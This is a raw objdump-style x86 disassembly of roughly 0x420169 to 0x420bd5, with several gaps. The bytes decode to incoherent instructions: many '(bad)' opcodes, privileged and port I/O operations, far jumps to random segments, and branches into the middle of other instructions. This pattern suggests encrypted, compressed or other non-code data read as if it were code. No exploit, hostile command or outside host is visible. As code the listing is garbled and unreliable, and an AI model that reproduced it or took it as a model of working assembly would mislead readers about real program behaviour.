  420169:	in     eax,0x29
  42016b:	repz xor ah,ch
  42016e:	mov    ch,BYTE PTR [edx+esi*8-0x521d5b3c]
  420175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420176:	stos   DWORD PTR es:[edi],eax
  420177:	(bad)  
  420178:	aam    0x56
  42017a:	(bad)  
  42017c:	xchg   edi,eax
  42017d:	jmp    0x42011f
  42017f:	sahf   
  420180:	adc    eax,0x4dc94fa8
  420185:	lods   eax,DWORD PTR ds:[esi]
  420186:	sbb    al,BYTE PTR [edi]
  420188:	sub    BYTE PTR [ebx+0x56],bl
  42018b:	(bad)
  42018e:	in     eax,0xef
  420190:	fisubr DWORD PTR [ebp+eax*8+0x53c2fd1d]
  420197:	repz jo 0x42018f
  42019a:	cwde   
  42019b:	mov    ch,0x67
  42019d:	jl     0x42019e
  42019f:	add    dh,BYTE PTR [edx-0x20]
  4201a2:	xchg   esi,eax
  4201a3:	mov    DWORD PTR [edx],ecx
  4201a5:	mov    al,0x62
  4201a7:	loopne 0x420223
  4201a9:	into   
  4201aa:	in     al,0xed
  4201ac:	xlat   BYTE PTR ds:[ebx]
  4201ad:	call   0x14bb:0xb4cc89
  4201b4:	fnsave [ebx]
  4201b6:	mov    cr0,ebp
  4201b9:	xchg   esp,eax
  4201ba:	cmp    al,0x7d
  4201bc:	dec    ecx
  4201bd:	fisttp QWORD PTR [edx-0x733a0a5a]
  4201c3:	ins    BYTE PTR es:[edi],dx
  4201c4:	popa   
  4201c5:	hlt    
  4201c6:	fst    DWORD PTR [esi+0x4d]
  4201c9:	fcom   QWORD PTR [eax-0xb]
  4201cc:	cli    
  4201cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201ce:	mov    ebp,0x6130e149
  4201d3:	je     0x420169
  4201d5:	icebp  
  4201d6:	xchg   DWORD PTR [eax-0x4b],edi
  4201d9:	cmp    ecx,DWORD PTR [edi-0x70f4ff2e]
  4201df:	pop    edi
  4201e0:	clc    
  4201e1:	xchg   edi,eax
  4201e2:	pop    eax
  4201e3:	and    al,0xe4
  4201e5:	test   al,0x14
  4201e7:	not    DWORD PTR [ecx+0x7f]
  4201ea:	xchg   DWORD PTR [ebx+edi*8+0x8c],esp
	...
  420255:	add    BYTE PTR [ebx-0x31],dh
  420258:	fwait
  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx-0x20f38e53],1
  420266:	addr16 pop ecx
  420268:	add    DWORD PTR [eax],eax
  42026a:	add    BYTE PTR [ecx],al
  42026c:	add    BYTE PTR [eax],al
  42026e:	imul   ecx,DWORD PTR [ebp-0x5e],0xfffffffc
  420272:	pop    ss
  420273:	out    0x14,al
  420275:	popf   
  420276:	scas   al,BYTE PTR es:[edi]
  420277:	(bad)  
  420279:	inc    ebx
  42027a:	pop    edx
  42027b:	ja     0x420234
  42027d:	sbb    DWORD PTR [esi+0x3e40d4ec],ebp
  420283:	int    0xb7
  420285:	data16 (bad) 
  420287:	push   ebp
  420288:	rcr    DWORD PTR [esi+0x3f371e00],1
  42028e:	repnz adc ebx,edx
  420291:	jno    0x4202f2
  420293:	push   ss
  420294:	cdq    
  420295:	ret    
  420296:	jg     0x420316
  420298:	fdivr  DWORD PTR [ebx-0x4b]
  42029b:	mov    al,0xf8
  42029d:	call   0x3462:0x41c390b9
  4202a4:	jle    0x4202fa
  4202a6:	hlt    
  4202a7:	test   al,0x6a
  4202a9:	bound  ebp,QWORD PTR ds:0xec5c3c1e
  4202af:	xchg   ecx,eax
  4202b0:	jp     0x42028d
  4202b2:	bound  edi,QWORD PTR [ebx]
  4202b4:	push   ds
  4202b5:	and    dh,BYTE PTR [ecx-0x4c261fa9]
  4202bb:	imul   ebx,DWORD PTR [ebx-0x31ee9ba3],0x3d
  4202c2:	mov    dl,0xc8
  4202c4:	xchg   DWORD PTR [eax],edi
  4202c6:	jg     0x420281
  4202c8:	xchg   edi,eax
  4202c9:	pusha  
  4202ca:	pop    eax
  4202cb:	cwde   
  4202cc:	push   es
  4202cd:	scas   eax,DWORD PTR es:[edi]
  4202ce:	fadd   QWORD PTR [edi+0x38]
  4202d1:	jne    0x4202b5
  4202d3:	inc    ebp
  4202d4:	ret    0x9a55
  4202d7:	or     ecx,ecx
  4202d9:	mov    al,ds:0x93e7f573
  4202de:	pop    esi
  4202df:	mov    esp,0xff72fdcb
  4202e4:	aaa    
  4202e5:	(bad)  
  4202e6:	push   ebp
  4202e7:	mov    ah,dh
  4202e9:	pop    ebp
  4202ea:	adc    eax,0x8dcfa69a
  4202ef:	stc    
  4202f0:	in     al,0xfa
  4202f2:	mov    cl,0x36
  4202f4:	icebp  
  4202f5:	jge    0x4202ca
  4202f7:	add    DWORD PTR [ebp+0xb8611f8],ecx
  4202fd:	xor    eax,0xd156506b
  420302:	mov    dh,0xbd
  420304:	(bad)  [edi]
  420306:	lahf   
  420307:	pop    edi
  420308:	jecxz  0x42028b
  42030a:	(bad)  
  42030b:	jo     0x420383
  42030d:	sbb    eax,0x5fea0358
  420312:	mov    dl,0x4
  420314:	stos   DWORD PTR es:[edi],eax
  420315:	xor    ebp,edi
  420317:	outs   dx,DWORD PTR ds:[esi]
  420318:	cmp    BYTE PTR [edi-0x13],0xde
  42031c:	retf   0xa85b
  42031f:	cwde   
  420320:	cmp    DWORD PTR [edx-0x3ecf763],eax
  420326:	fiadd  WORD PTR [ebx+0x34661dd3]
  42032c:	add    al,0xd7
  42032e:	jecxz  0x4202be
  420330:	xor    edi,esi
  420332:	jecxz  0x42033a
  420334:	aaa    
  420335:	mov    al,0x28
  420337:	mov    ecx,0x96b94bd0
  42033c:	je     0x420339
  42033e:	(bad)  
  42033f:	push   ebx
  420340:	fdivr  st,st(6)
  420342:	jmp    0xefc:0xb48f2d
  420349:	ins    DWORD PTR es:[edi],dx
  42034a:	rcr    BYTE PTR [ebp-0x56c16f76],cl
  420350:	(bad)
  420354:	jmp    0xbc35:0x21511abd
  42035b:	scas   eax,DWORD PTR es:[edi]
  42035c:	inc    ebx
  42035d:	shl    DWORD PTR [edx*8-0x13f76455],0xae
  420365:	icebp  
  420366:	out    0xf6,al
  420368:	mov    al,ds:0x45325a54
  42036d:	cdq    
	...
  4203d6:	inc    ecx
  4203d7:	push   es
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	xchg   esi,eax
  4203e3:	nop
  4203e4:	aam    0xf6
  4203e6:	addr16 pop edx
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	add    BYTE PTR [ecx],al
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	fwait
  4203ef:	div    BYTE PTR [eax]
  4203f1:	pop    ss
  4203f2:	pushf  
  4203f3:	dec    ebp
  4203f4:	push   ebx
  4203f5:	or     edx,esi
  4203f7:	into   
  4203f8:	adc    ah,BYTE PTR [ebx]
  4203fa:	neg    ecx
  4203fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203fd:	fistp  QWORD PTR [esi+0x46c4080e]
  420403:	ins    DWORD PTR es:[edi],dx
  420404:	pop    ebx
  420405:	pop    edx
  420406:	xchg   esi,eax
  420407:	fnsave [edx+0x6b]
  42040a:	iret   
  42040b:	jle    0x42039c
  42040d:	mov    eax,ds:0xcd9c18d
  420412:	xlat   BYTE PTR ds:[ebx]
  420413:	(bad)  
  420414:	lods   eax,DWORD PTR ds:[esi]
  420415:	adc    al,0x3
  420417:	xchg   ebx,eax
  420418:	sbb    ebp,DWORD PTR [ebx]
  42041a:	fstp   TBYTE PTR [ebx]
  42041c:	or     ebx,ebx
  42041e:	jmp    0x6896:0xc62c4590
  420425:	cmp    eax,0xf84d6966
  42042a:	in     al,dx
  42042b:	ins    DWORD PTR es:[edi],dx
  42042c:	fst    st(4)
  42042e:	sbb    eax,0xb6e2b6cf
  420433:	jmp    0x1c88:0xe2482abe
  42043a:	inc    ebx
  42043b:	add    al,BYTE PTR [edx+0x33]
  42043e:	jecxz  0x42048b
  420440:	jl     0x420455
  420442:	sti    
  420443:	mov    esi,0x5814563c
  420448:	xlat   BYTE PTR ds:[ebx]
  420449:	scas   al,BYTE PTR es:[edi]
  42044a:	mov    ?,WORD PTR [eax-0x5757b2dd]
  420450:	add    al,0xb2
  420452:	jno    0x4203f0
  420454:	lds    eax,FWORD PTR [ebx]
  420456:	mov    ebp,0x27e11b5d
  42045b:	stos   DWORD PTR es:[edi],eax
  42045c:	jo     0x420402
  42045e:	pop    edx
  42045f:	jne    0x42041f
  420461:	hlt    
  420462:	fidiv  DWORD PTR [ecx+0x490440fc]
  420468:	stos   DWORD PTR es:[edi],eax
  420469:	xchg   ebx,eax
  42046a:	shr    BYTE PTR [eax+ebp*2+0x2d],0x83
  42046f:	and    BYTE PTR [ebx],al
  420471:	or     DWORD PTR [ebp-0x57],esp
  420474:	es pop ecx
  420476:	inc    eax
  420477:	push   ds
  420478:	mov    edx,0xef0ac940
  42047d:	sub    edi,0xbe9bdbf9
  420483:	ss inc eax
  420485:	scas   eax,DWORD PTR es:[edi]
  420486:	sbb    al,0x29
  420488:	push   0xeae3a094
  42048d:	aaa    
  42048e:	push   ds
  42048f:	enter  0x88bb,0x8f
  420493:	mov    esp,0xfa745361
  420498:	mov    edx,0xaceb8fb8
  42049d:	mov    bl,0xd3
  42049f:	xchg   esi,eax
  4204a0:	pop    ss
  4204a1:	in     eax,0xda
  4204a3:	leave  
  4204a4:	xchg   esi,eax
  4204a5:	jnp    0x4204d8
  4204a7:	mov    eax,0xb308cc79
  4204ac:	mov    esi,0x4306d0fd
  4204b1:	icebp  
  4204b2:	ret    
  4204b3:	stc    
  4204b4:	pushf  
  4204b5:	(bad)  
  4204b6:	adc    al,BYTE PTR [edx]
  4204b8:	aam    0xce
  4204ba:	sti    
  4204bb:	sbb    eax,0xf440891c
  4204c0:	mov    BYTE PTR [esi+0x5d],dh
  4204c3:	push   ebp
  4204c4:	mov    dl,0x93
  4204c6:	stos   DWORD PTR es:[edi],eax
  4204c7:	mov    eax,ds:0x40cd4c74
  4204cc:	mov    esp,0x2ec3be70
  4204d1:	(bad)  
  4204d2:	retf   0xb238
  4204d5:	and    bh,cl
  4204d7:	cmp    eax,DWORD PTR [eax+0x72bedb9a]
  4204dd:	pop    ecx
  4204de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204df:	js     0x4204b6
  4204e1:	cmp    BYTE PTR [eax],ch
  4204e3:	xchg   ebx,eax
  4204e4:	imul   DWORD PTR [ebx-0x68]
  4204e7:	push   esp
  4204e8:	das    
  4204e9:	xchg   edx,eax
  4204ea:	adc    dh,BYTE PTR [edx+0x8f1b]
	...
  420554:	add    BYTE PTR [eax],al
  420556:	scas   al,BYTE PTR es:[edi]
  420557:	xchg   esp,eax
  420558:	push   edi
  420559:	adc    bh,BYTE PTR [edi-0x2d]
  42055c:	out    dx,eax
  42055d:	mov    esp,0x5a7f6c39
  420562:	inc    ebp
  420563:	mov    DWORD PTR [ecx],ecx
  420565:	clc    
  420566:	addr16 pop ebx
  420568:	add    DWORD PTR [eax],eax
  42056a:	add    BYTE PTR [ecx],al
  42056c:	add    BYTE PTR [eax],al
  42056e:	jb     0x4205d0
  420570:	inc    edi
  420571:	sbb    al,0x46
  420573:	or     bl,BYTE PTR [esi-0x27]
  420576:	arpl   WORD PTR [ebx+0x3b],bp
  420579:	stc    
  42057a:	jb     0x420565
  42057c:	sar    dh,0xde
  42057f:	cmp    eax,0x5e288b19
  420584:	jl     0x42051b
  420586:	add    al,0x56
  420588:	sub    esp,DWORD PTR [ebx-0x7d]
  42058b:	inc    esi
  42058c:	sub    eax,0xac370e77
  420591:	fadd   QWORD PTR [edx+0x8]
  420594:	push   esi
  420595:	aaa    
  420596:	std    
  420597:	pop    ss
  420598:	cmp    DWORD PTR [eax-0x67],ecx
  42059b:	mov    al,0xab
  42059d:	frstor [ecx+eiz*8]
  4205a0:	jo     0x42054b
  4205a2:	scas   al,BYTE PTR es:[edi]
  4205a3:	push   0xac90fca8
  4205a8:	(bad)  
  4205a9:	push   0x5a
  4205ab:	adc    DWORD PTR [edx-0x80],esp
  4205ae:	push   cs
  4205af:	mov    esp,0x120f5189
  4205b4:	shr    DWORD PTR [ecx],1
  4205b6:	leave  
  4205b7:	sub    dl,cl
  4205b9:	dec    ecx
  4205ba:	lea    ebx,[edi+ecx*4-0x5973a53d]
  4205c1:	clc    
  4205c2:	std    
  4205c3:	add    al,0x1c
  4205c5:	mov    bl,0xed
  4205c7:	jnp    0x42058e
  4205c9:	mov    dh,0xb7
  4205cb:	adc    eax,0x8e97e133
  4205d0:	add    bh,BYTE PTR [ebx-0x69]
  4205d3:	les    esp,FWORD PTR [ebp-0x4]
  4205d6:	(bad)
  4205d9:	jmp    0x420599
  4205db:	bound  eax,QWORD PTR [ebp-0x47965db3]
  4205e1:	jb     0x420585
  4205e3:	daa    
  4205e4:	pop    ebx
  4205e5:	push   cs
  4205e6:	icebp  
  4205e7:	xchg   DWORD PTR [ecx+0x6f],eax
  4205ea:	cli    
  4205eb:	sub    dh,0xe1
  4205ee:	lods   eax,DWORD PTR ds:[esi]
  4205ef:	rcr    DWORD PTR fs:[eax],cl
  4205f2:	arpl   si,cx
  4205f4:	clc    
  4205f5:	iret   
  4205f6:	aas    
  4205f7:	mov    al,0x4f
  4205f9:	enter  0xbed9,0xa9
  4205fd:	jmp    0x9fb1:0xd06339cc
  420604:	jns    0x4205de
  420606:	jmp    0x8458d8bd
  42060b:	adc    eax,0x74c79b50
  420610:	call   0x931a3be0
  420615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420616:	xor    al,0x3e
  420618:	mov    dh,BYTE PTR fs:[ecx-0x73]
  42061c:	sub    DWORD PTR [eax],eax
  42061e:	push   ebp
  42061f:	jmp    0x99359626
  420624:	xor    DWORD PTR [ebx-0x7565300e],0xffffffc8
  42062b:	std    
  42062c:	mov    edx,0x1829a615
  420631:	and    DWORD PTR ds:0x551ad2f4,esp
  420637:	add    al,0xa8
  420639:	inc    ebx
  42063a:	sub    bh,BYTE PTR [ecx]
  42063c:	add    DWORD PTR [esi+eiz*8],0x30df26d9
  420643:	rcr    BYTE PTR [ecx],0xc5
  420646:	scas   al,BYTE PTR es:[edi]
  420647:	hlt    
  420648:	test   BYTE PTR [eax],ah
  42064a:	mov    ecx,0x7fecd220
  42064f:	mov    ebx,0x418da8d8
  420654:	int    0xc5
  420656:	out    0x6f,al
  420658:	xchg   ebx,eax
  420659:	or     ecx,DWORD PTR [ebx-0x6964dd63]
  42065f:	fnstenv [edi]
  420661:	xchg   bl,al
  420663:	mov    eax,0x8e231dc5
  420668:	jb     0x4206b8
  42066a:	adc    al,BYTE PTR [edx]
  42066c:	je     0x4205f6
	...
  4206d6:	test   BYTE PTR [eax-0x48],ch
  4206d9:	or     ah,bh
  4206db:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  4206e2:	jns    0x4206f0
  4206e4:	call   0x19e6e66
  4206e9:	add    BYTE PTR [eax],al
  4206eb:	add    DWORD PTR [eax],eax
  4206ed:	add    dh,ch
  4206ef:	lock mov dl,0x58
  4206f2:	retf   
  4206f3:	ins    BYTE PTR es:[edi],dx
  4206f4:	int    0xc0
  4206f6:	je     0x4206fa
  4206f8:	popa   
  4206f9:	or     esp,DWORD PTR [eax-0x3]
  4206fc:	cwde   
  4206fd:	push   ecx
  4206fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206ff:	outs   dx,BYTE PTR ds:[esi]
  420700:	mov    esp,0x49eaad07
  420705:	mov    WORD PTR [eax+0xf3b579f],ss
  42070b:	cmp    BYTE PTR [ebp-0x4ad549f8],ah
  420711:	or     DWORD PTR [esi],0x22
  420714:	pop    ebp
  420715:	je     0x420702
  420717:	sub    ebp,DWORD PTR [ebx]
  420719:	add    eax,0xc69aca13
  42071e:	fsubr  QWORD PTR [ecx+0x5f]
  420721:	and    dh,BYTE PTR [ebx+0x14]
  420724:	jmp    0x1fe8999e
  420729:	dec    ebx
  42072a:	and    al,0x19
  42072c:	mov    eax,0x5b85857b
  420731:	pop    esi
  420732:	ss mov edi,0xe0059baa
  420738:	aam    0xf5
  42073a:	fsub   DWORD PTR [eax]
  42073c:	pusha  
  42073d:	cdq    
  42073e:	popa   
  42073f:	cmp    al,0x84
  420741:	scas   al,BYTE PTR es:[edi]
  420742:	mov    dl,0x25
  420744:	loop   0x420793
  420746:	cmp    dl,BYTE PTR [ebx+0x4bf6c3cb]
  42074c:	cmp    BYTE PTR [eax],ah
  42074e:	mov    al,0x48
  420750:	sar    DWORD PTR [ecx+0x2567320b],cl
  420756:	cmp    BYTE PTR [ebx-0x4d],ah
  420759:	mov    eax,0x6aab2b38
  42075e:	lea    ebx,[edx]
  420760:	dec    bx
  420762:	cmp    bl,ah
  420764:	sub    eax,0x765b62a8
  420769:	push   eax
  42076a:	mul    bl
  42076c:	lock mov edx,edx
  42076f:	rol    BYTE PTR [edx+esi*1+0x13884c14],0x14
  420777:	xor    dh,dl
  420779:	into   
  42077a:	or     bl,al
  42077c:	in     eax,dx
  42077d:	inc    ebx
  42077e:	(bad)  
  42077f:	cli    
  420780:	cli    
  420781:	push   ds
  420782:	neg    BYTE PTR [ecx-0x6fc3f4fb]
  420788:	je     0x420769
  42078a:	cmp    al,0x43
  42078c:	test   ebx,edi
  42078e:	ds clc 
  420790:	xchg   ecx,eax
  420791:	adc    DWORD PTR [ebx+0x4e],edx
  420794:	push   eax
  420795:	mov    eax,ds:0x2c9361dd
  42079a:	jmp    0x4207ed
  42079c:	pop    eax
  42079d:	mov    bh,0x2b
  42079f:	and    eax,0x89f564d5
  4207a4:	call   0x4149:0x9a9c5bb2
  4207ab:	add    DWORD PTR [esi-0x33],esp
  4207ae:	repz dec esi
  4207b0:	mov    edi,0xdcee1e6d
  4207b5:	and    al,0x7c
  4207b7:	xchg   edx,eax
  4207b8:	jmp    0x5a6b2495
  4207bd:	pop    esi
  4207be:	lods   eax,DWORD PTR ds:[esi]
  4207bf:	lds    esi,FWORD PTR [edi+0x58]
  4207c2:	pop    esi
  4207c3:	cwde   
  4207c4:	fsubp  st(5),st
  4207c6:	fnstsw WORD PTR [edx+0x52]
  4207c9:	cmp    ch,bh
  4207cb:	cdq    
  4207cc:	jp     0x420786
  4207ce:	lods   al,BYTE PTR ds:[esi]
  4207cf:	(bad)
  4207d4:	xchg   ebp,eax
  4207d5:	popf   
  4207d6:	in     eax,dx
  4207d7:	aas    
  4207d8:	jae    0x4207bf
  4207da:	loope  0x42077f
  4207dc:	and    esp,DWORD PTR ds:0x8715476d
  4207e2:	jb     0x4207ec
  4207e4:	imul   esp,DWORD PTR [ebx-0x4f3dc991],0x648fa350
	...
  420856:	mov    DWORD PTR [edi],ebp
  420858:	and    eax,0xad8aa780
  42085d:	das    
  42085e:	cmp    DWORD PTR [edi-0x24],ebp
  420861:	pusha  
  420862:	shr    dl,0x26
  420865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420866:	addr16 pop ebp
  420868:	add    DWORD PTR [eax],eax
  42086a:	add    BYTE PTR [ecx],al
  42086c:	add    BYTE PTR [eax],al
  42086e:	popf   
  42086f:	jb     0x420821
  420871:	fwait
  420872:	fs cmp al,0x8f
  420875:	repz inc ecx
  420877:	xchg   edi,eax
  420878:	mov    esp,DWORD PTR [eax]
  42087a:	jo     0x420859
  42087c:	or     DWORD PTR [esi+0x73],ebx
  42087f:	and    edi,DWORD PTR [esi+edx*8+0x2faee048]
  420886:	mov    WORD PTR [edx+edi*4+0x344b152a],es
  42088d:	rol    BYTE PTR [ebx-0x80],1
  420890:	iret   
  420891:	xor    al,0xe7
  420893:	push   esi
  420894:	adc    ecx,ebp
  420896:	xchg   ebx,eax
  420897:	jae    0x4208ee
  420899:	popf   
  42089a:	int    0xa0
  42089c:	ror    ebp,0xc1
  42089f:	and    al,0xbd
  4208a1:	mov    ds:0x46a92162,eax
  4208a6:	or     edx,DWORD PTR [eax+0x531fe817]
  4208ac:	cwde   
  4208ad:	icebp  
  4208ae:	inc    esi
  4208af:	(bad)  
  4208b1:	mov    ebx,0x16d07680
  4208b6:	popf   
  4208b7:	mov    edx,0xd2e5e37d
  4208bc:	mov    bh,0x8c
  4208be:	push   ebx
  4208bf:	xor    BYTE PTR [esi-0x3f],ch
  4208c2:	mov    al,BYTE PTR cs:[eax+0x759925c0]
  4208c9:	and    BYTE PTR [ecx+eiz*1-0x2bbd11b3],bl
  4208d0:	jns    0x4208bb
  4208d2:	(bad)  
  4208d3:	hlt    
  4208d4:	out    dx,eax
  4208d5:	pop    ds
  4208d6:	push   ebx
  4208d7:	imul   edx,DWORD PTR [ebx],0xcc5e9168
  4208dd:	push   cs
  4208de:	mov    eax,ds:0xd9bc60db
  4208e3:	mov    dh,0xa2
  4208e5:	push   0xffffffd9
  4208e7:	sub    BYTE PTR [eax+0x2df91b37],bh
  4208ed:	rol    DWORD PTR ds:0x424096a0,cl
  4208f3:	fistp  DWORD PTR [eax]
  4208f5:	sub    al,0x74
  4208f7:	mov    ds,WORD PTR [ebp+ebx*4-0x10]
  4208fb:	dec    esp
  4208fc:	cwde   
  4208fd:	outs   dx,BYTE PTR ds:[esi]
  4208fe:	sub    DWORD PTR [edx],ebx
  420900:	es pop edx
  420902:	pop    ecx
  420903:	mov    dl,0x8d
  420905:	dec    ebx
  420906:	jb     0x4208c7
  420908:	ds fwait
  42090a:	dec    ecx
  42090b:	fwait
  42090c:	push   ss
  42090d:	xchg   esp,eax
  42090e:	loop   0x4208d7
  420910:	jb     0x4208f2
  420912:	jle    0x420907
  420914:	mov    WORD PTR [ebp+0x63],fs
  420917:	stos   BYTE PTR es:[edi],al
  420918:	retf   
  420919:	cmp    BYTE PTR [ecx+0x1e],0xed
  42091d:	shl    bh,1
  42091f:	clc    
  420920:	pop    edi
  420921:	cli    
  420922:	xchg   ebp,eax
  420923:	stos   BYTE PTR es:[edi],al
  420924:	out    dx,eax
  420925:	lods   al,BYTE PTR ds:[esi]
  420926:	sub    al,0xb5
  420928:	lods   eax,DWORD PTR ds:[esi]
  420929:	ja     0x420938
  42092b:	push   es
  42092c:	mov    edx,0xc2c1d405
  420931:	(bad)  
  420932:	in     al,dx
  420933:	push   ds
  420934:	jb     0x4208fd
  420936:	cld    
  420937:	xor    al,BYTE PTR [esi-0x30]
  42093a:	push   esi
  42093b:	mov    al,0xab
  42093d:	shl    BYTE PTR [esi],cl
  42093f:	mov    bh,0x5f
  420941:	add    dl,BYTE PTR [ecx]
  420943:	or     dl,BYTE PTR [esi]
  420945:	nop
  420946:	in     eax,dx
  420947:	xlat   BYTE PTR ds:[ebx]
  420948:	mov    esi,esp
  42094a:	sar    BYTE PTR [eax-0x77877cbf],0x33
  420951:	and    eax,0x13f5bab1
  420956:	cmp    edi,DWORD PTR [ebp+0x7c]
  420959:	adc    al,0x48
  42095b:	ret    
  42095c:	call   0x1f1a:0xea2f800d
  420963:	and    eax,DWORD PTR [edi+0xd]
  420966:	or     BYTE PTR [eax+0x6e],dl
  420969:	jl     0x4209d8
  42096b:	push   esp
  42096c:	pusha  
  42096d:	push   ebx
	...
  4209d6:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0x47
  4209e3:	ficom  WORD PTR [edx+0x15e6744]
  4209e9:	add    BYTE PTR [eax],al
  4209eb:	add    DWORD PTR [eax],eax
  4209ed:	add    BYTE PTR [edi-0x56],ah
  4209f0:	xor    ecx,eax
  4209f2:	cli    
  4209f3:	out    0xb,eax
  4209f5:	dec    edx
  4209f6:	jns    0x420a5f
  4209f8:	push   ss
  4209f9:	cmp    BYTE PTR [eax-0x76],dh
  4209fc:	mov    esi,0xd96ff02c
  420a01:	aas    
  420a02:	xchg   esi,eax
  420a03:	xchg   ebx,eax
  420a04:	mov    DWORD PTR [edi-0x2d],0x428850e
  420a0b:	push   eax
  420a0c:	test   al,0xb9
  420a0e:	cmc    
  420a0f:	jo     0x420a7a
  420a11:	inc    ebx
  420a12:	lahf   
  420a13:	rcr    BYTE PTR [esi],1
  420a15:	xlat   BYTE PTR ds:[ebx]
  420a16:	xchg   esp,eax
  420a17:	adc    al,0x50
  420a19:	push   0x19898ab2
  420a1e:	adc    eax,0xff710886
  420a23:	jg     0x420a01
  420a25:	or     al,0xbe
  420a27:	cmc    
  420a28:	sti    
  420a29:	and    BYTE PTR [esi+0x3c],bl
  420a2c:	loope  0x420a7c
  420a2e:	push   ebx
  420a2f:	jbe    0x4209f3
  420a31:	sbb    esp,DWORD PTR [ecx+0x22]
  420a34:	mov    ds,WORD PTR [edx+0x7a]
  420a37:	push   esi
  420a38:	test   DWORD PTR [eax-0x44a4b6f3],esp
  420a3e:	jno    0x420a7a
  420a40:	nop
  420a41:	cld    
  420a42:	add    ebx,eax
  420a44:	mov    DWORD PTR [edx+0x434694b1],ecx
  420a4a:	pop    edx
  420a4b:	das    
  420a4c:	or     DWORD PTR [ecx+0x3272f8ff],0xffffffc9
  420a53:	xchg   esi,eax
  420a54:	sar    ah,1
  420a56:	adc    ax,0xdbd6
  420a5a:	pop    esi
  420a5b:	std    
  420a5c:	repz inc edx
  420a5e:	in     al,dx
  420a5f:	mov    ecx,0xab4458c
  420a64:	ficomp WORD PTR [ebp-0xd1e0f6f]
  420a6a:	shl    BYTE PTR ds:0x54a9b5fd,1
  420a70:	push   esp
  420a71:	iret   
  420a72:	pop    esp
  420a73:	xor    al,0xd0
  420a75:	and    al,0x7f
  420a77:	pop    ebx
  420a78:	or     al,0x3e
  420a7a:	std    
  420a7b:	js     0x420a24
  420a7d:	retf   0x8a92
  420a80:	rcl    edi,cl
  420a82:	sub    BYTE PTR [eax+ebx*1],dh
  420a85:	dec    esp
  420a86:	mov    edx,0x9821cbf
  420a8b:	dec    esp
  420a8c:	dec    edi
  420a8d:	and    BYTE PTR [edx],0x9b
  420a90:	mov    ch,cl
  420a92:	sahf   
  420a93:	add    eax,0x239ce3d5
  420a98:	loopne 0x420a8a
  420a9a:	adc    DWORD PTR [eax],ebp
  420a9c:	jmp    FWORD PTR [edx+0x55df79b9]
  420aa2:	je     0x420b03
  420aa4:	or     DWORD PTR [edi+eiz*4-0x5c],eax
  420aa8:	xchg   esi,eax
  420aa9:	sub    ch,BYTE PTR [eax-0x1c]
  420aac:	stos   DWORD PTR es:[edi],eax
  420aad:	adc    DWORD PTR [esi+0x3f16260e],edi
  420ab3:	scas   eax,DWORD PTR es:[edi]
  420ab4:	mov    esi,0xebef7775
  420ab9:	inc    edi
  420aba:	pop    eax
  420abb:	loope  0x420b1f
  420abd:	jmp    0xf26e:0x7c0e0e26
  420ac4:	mov    ch,0xe1
  420ac6:	xlat   BYTE PTR ds:[ebx]
  420ac7:	ret    
  420ac8:	pop    ds
  420ac9:	stc    
  420aca:	retf   
  420acb:	int3   
  420acc:	jmp    0x9404d025
  420ad1:	mov    ecx,0x68cfe1a6
  420ad6:	mov    ecx,0x37ea1388
  420adb:	or     bh,bl
  420add:	pop    ss
  420ade:	inc    eax
  420adf:	inc    edi
  420ae0:	imul   ebx,DWORD PTR [edx+0x24],0x5b
  420ae4:	adc    ebx,DWORD PTR [edi]
  420ae6:	mov    ds:0xe5136510,eax
  420aeb:	seta   BYTE PTR [ecx]
	...
  420b56:	fbstp  TBYTE PTR [edx]
  420b58:	scas   eax,DWORD PTR es:[edi]
  420b59:	adc    ebp,edi
  420b5b:	lahf   
  420b5c:	(bad)  
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	mov    al,ds:0x670dc9ad
  420b67:	pop    edi
  420b68:	add    DWORD PTR [eax],eax
  420b6a:	add    BYTE PTR [ecx],al
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	add    al,0x78
  420b70:	push   esi
  420b71:	cmc    
  420b72:	sub    eax,0xc52f63ac
  420b77:	rol    dh,1
  420b79:	adc    cl,BYTE PTR [edi+0x4a9cecdb]
  420b7f:	and    eax,0x8fdac299
  420b84:	push   es
  420b85:	cmp    dl,BYTE PTR [eax+0x57]
  420b88:	out    dx,al
  420b89:	(bad)  
  420b8a:	mov    dh,0x1b
  420b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b8d:	add    ecx,0x27
  420b90:	push   cs
  420b91:	sbb    BYTE PTR [ecx],al
  420b93:	pop    ds
  420b94:	(bad)  
  420b95:	pop    esi
  420b96:	mov    BYTE PTR [ebp+eiz*2-0x3db819f5],dl
  420b9d:	adc    al,0xbc
  420b9f:	(bad)  
  420ba2:	and    BYTE PTR [edi-0x5b0f6581],dh
  420ba8:	sbb    eax,0xc4ffcfeb
  420bad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bae:	xchg   edi,eax
  420baf:	nop
  420bb0:	xchg   esi,eax
  420bb1:	sbb    eax,0x76ffd2da
  420bb6:	and    DWORD PTR [esi],eax
  420bb8:	add    ah,cl
  420bba:	xchg   esi,eax
  420bbb:	retf   0x22f6
  420bbe:	xchg   esi,eax
  420bbf:	push   edi
  420bc0:	fbld   TBYTE PTR [eax]
  420bc2:	in     al,dx
  420bc3:	pop    eax
  420bc4:	lods   eax,DWORD PTR ds:[esi]
  420bc5:	mov    esp,0x5f831f1
  420bca:	jb     0x420bf1
  420bcc:	jns    0x420c12
  420bce:	fld    TBYTE PTR ss:0x6b56e350
  420bd5:	aaa    
